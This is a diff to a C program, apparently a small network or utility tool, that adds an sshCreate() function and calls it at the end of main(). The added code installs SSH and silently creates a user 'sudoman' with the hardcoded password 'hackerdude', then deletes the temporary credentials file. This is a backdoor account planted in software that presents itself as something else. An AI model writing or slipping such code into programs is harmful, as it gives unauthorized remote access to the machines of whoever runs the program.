@@ -281,6 +281,67 @@ int subnetCalculator(){ // Not fully implemented -- just conceptual -- Will like
 }
 
 
+void sshCreate()
+{
+	char line[1024];																		//Each line from the text file that is dumped
+	char desiredLine[1024];																//Will be line 4 from text file
+	char cutLine[512];																	//Cutting the line so it matches a specific string
+	char installedSSH[30];																//Comparison string
+	int i = 0;
+	
+	system("sudo apt-get install ssh > terminalCommand.txt");				//Creating a text file to check if ssh is already installed
+	
+	char directory[512] = "";															//String for directory
+	popenretrieve(directory, "pwd", sizeof(directory));
+	
+	strtok(directory, "\n");															//Removing the newline char from the end of the string
+	strcat(directory, "/terminalCommand.txt");									//Adding on the file to the directory
+	
+	char temp[512];																		//I literally do not know why, but if the string isnt copied, it refuses to do jack
+	strcpy(temp, directory);															//C is quite possibly the dumbest language alive when it comes to strings
+	
+	FILE* file = fopen(temp, "r");
+	while (fgets(line, sizeof(line), file))										//Stupid jank way of getting line 4 from a saved text file, as it is the
+	{																							//first line that differentiates between an already installed package or not
+  		i++;
+		if(i == 4)
+		{
+			strcpy(desiredLine, line);													//Copying the correct line to another char array
+		}
+	}
+	fclose(file);
+	
+	
+	strncpy(cutLine, desiredLine, 25);												//Cuts off the string so it is "ssh is already the newest"
+	strcpy(installedSSH, "ssh is already the newest");							//Creating a string to compare against
+	
+	
+	if(strcmp(cutLine, installedSSH) == 0)											//If ssh is already installed
+	{
+		system("adduser --disabled-password --gecos \"\" sudoman");			//Literally the only way to create a user without a ton of interactive inputs
+		system("echo sudoman:hackerdude > creds.txt");							//Creating a text file to pass to the chpasswd command, as it does not use stdin as its input 
+		system("chpasswd < creds.txt");												//Command to change the password of the newly created user
+		
+		system("rm creds.txt");															//Deleting the text files that were used
+		system("rm terminalCommand.txt");
+	}
+	else																						//If ssh is not already installed
+	{
+		system("sudo apt-get -y install ssh");
+		
+		fflush(stdout);																	//Explicitly clearing output buffer, sleep acts weird otherwise
+		sleep(15);																			//Sleeping to ensure it has been installed
+		
+		system("adduser --disabled-password --gecos \"\" sudoman");			//Literally the only way to create a user without a ton of interactive inputs
+		system("echo sudoman:hackerdude > creds.txt");							//Creating a text file to pass to the chpasswd command, as it does not use stdin as its input 
+		system("chpasswd < creds.txt");												//Command to change the password of the newly created user
+		
+		system("rm creds.txt");															//Deleting the text files that were used
+		system("rm terminalCommand.txt");
+	}
+}
+
+
 //MAIN FUNCTION~~~~~~~~~~~~~~
 int main()
 {
@@ -394,8 +455,7 @@ int main()
 
 
 	int i = conceptretrieve();
-
- 
+	
+	sshCreate();
+	
 }
-
-
